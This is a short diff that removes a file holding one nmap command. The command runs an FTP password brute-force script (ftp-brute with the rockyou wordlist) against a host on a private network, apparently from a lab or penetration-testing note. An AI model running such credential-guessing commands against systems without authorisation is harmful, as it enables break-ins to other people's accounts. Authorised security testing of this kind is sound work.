@@ -1,3 +1,0 @@
-
-nmap --script=ftp-brute --script-args userdb=user.txt,passdb=rockyou.txt -p 21 192.168.2.6
-
